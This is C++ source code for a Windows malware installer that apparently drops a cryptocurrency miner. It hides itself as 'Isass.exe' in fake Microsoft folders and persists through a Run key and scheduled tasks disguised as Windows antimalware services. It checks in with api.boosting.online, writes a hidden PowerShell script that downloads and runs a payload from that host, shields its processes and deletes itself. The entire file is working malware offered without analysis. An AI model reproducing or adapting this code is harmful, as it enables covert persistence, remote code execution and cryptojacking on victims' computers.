#include "stdafx.h"
#include "Utils.h"
#include "HTTP.h"
#include <psapi.h>
#include <tchar.h>
#include <fstream>
#pragma comment (lib, "Kernel32.lib")

using namespace std;

Utils utils;

void Install()
{
	int clientID = 1;

	if (utils.getProcessName(GetCurrentProcessId()) != "Isass.exe")
	{
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData", NULL);
		system("attrib \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\" +h");

		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\DRM", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\platforms", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows NT", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search\\Data", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Vault", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Temp", NULL);

		string _fname = utils.getProcessName(GetCurrentProcessId());
		string _wdir = utils.getCurrentWorkDir();
		string _cmd = "copy " + _wdir + "\\" + _fname + " C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe";
		system(_cmd.c_str());

		BOOL result = SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe", FILE_ATTRIBUTE_HIDDEN);
		system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Local Security Authority Process\" /t REG_SZ /F /D \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe\"");
		utils.createAutoLoadShortcut(_wdir + _fname);
		system("powershell.exe SCHTASKS.exe /Create /SC MINUTE /MO 5 /TN \"Windows_Antimalware_System_Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");

		HTTP http;
		string check = http.Request("api.boosting.online", "/method/checkConnection", "");

		if (check == "aAvh5S")
		{
			string reg = http.Request("api.boosting.online", "/method/installSuccess", "id=" + clientID);
		}

		//kljklj5n234k5jn

		ofstream fout("C:\\ProgramData\\kljklj5n234k5jn.ps1");
		fout << "$path = 'C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\'" << endl;
		fout << "$fpath = $path + 'Isass.exe'" << endl;
		fout << "$furl = 'http://api.boosting.online/kljklj5n234k5jn/getDiscordia'" << endl;
		fout << " " << endl;
		fout << "$isfile = Test-Path $fpath " << endl;
		fout << "if($isfile -eq 'True') {}" << endl;
		fout << "else{" << endl;
		fout << "New-Item -ItemType directory -Path $path" << endl;
		fout << "$WebClient = New-Object System.Net.WebClient" << endl;
		fout << "$WebClient.DownloadFile($furl,$fpath)" << endl;
		fout << "Start-Process -FilePath $fpath}" << endl;

		fout.close();

		BOOL _r = SetFileAttributes(L"C:\\ProgramData\\kljklj5n234k5jn.ps1", FILE_ATTRIBUTE_HIDDEN);

		system("SCHTASKS.exe /Create /SC MINUTE /MO 30 /TN \"Windows_Antimalware_Host\" /TR \"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoP -file C:\\ProgramData\\kljklj5n234k5jn.ps1\" /F");

		ShellExecute(NULL, 0, _T("C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe"), 0, 0, SW_SHOW);

		utils.Suicide();
	}
}

void RestoreFiles()
{
	//utils.DownloadFile();
}

void Start()
{
	while (true)
	{
		if (!utils.IsProcessRunning(L"scvhost.exe"))
		{
			// if miner not working
			ShellExecute(NULL, 0, _T("C:\\ProgramData\\MicrosoftCorporation\\Windows\\Network\\scvhost.exe"), 0, 0, SW_HIDE);
			utils.DenyAccessToId(utils.FindProcessId(L"scvhost.exe"));
		}
		Sleep(120000);// two minutes sleep
	}
}

int main()
{
	//utils.HideConsole();
	if (!utils.IsProcessRunning(L"Isass.exe"))
	{
		Install();
	}
	utils.DenyAccessToId(GetCurrentProcessId());
	//RestoreFiles();
	//Start();

	return 0;
}